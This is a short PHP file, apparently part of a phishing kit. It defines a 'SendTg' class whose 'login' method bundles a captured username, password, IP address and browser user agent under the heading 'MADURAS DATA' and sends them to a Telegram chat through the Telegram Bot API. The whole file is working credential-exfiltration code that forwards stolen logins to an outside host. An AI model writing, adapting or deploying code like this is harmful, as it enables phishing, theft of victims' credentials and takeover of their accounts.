<?php
class SendTg {
    protected $title = 'MADURAS';
    protected $bot_token;
    protected $chat_id;

    function __construct($bot_token, $chat_id)
    {
        $this->bot_token = $bot_token;
        $this->chat_id = $chat_id;
    }

    public function send($msg) {
        $apiToken = $this->bot_token;
        $data = [
            'chat_id' => $this->chat_id,
            'text' => $msg,
            'parse_mode' => 'HTML',
        ];

        return (!empty($this->bot_token) && !empty($this->chat_id))
        ? file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data))
        : false;
    }

    public function makeMsg($params = []) {
        $msg = '';
        if (!empty($params) && count($params) >= 1) {
            foreach ($params as $key => $value) {
                $msg .= "\n{$key} : <code>".$value."</code>";
            }
        }
        return $msg;
    }

    public function login($user, $pass, $ip, $ua) {
        $msg  = "{$this->title} DATA\n";
        $msg .= $this->makeMsg(["NAME" => $user, "CORREO" => $pass, "IP" => $ip, "\nUA" => $ua]);
        $this->send($msg);
    }

}

?>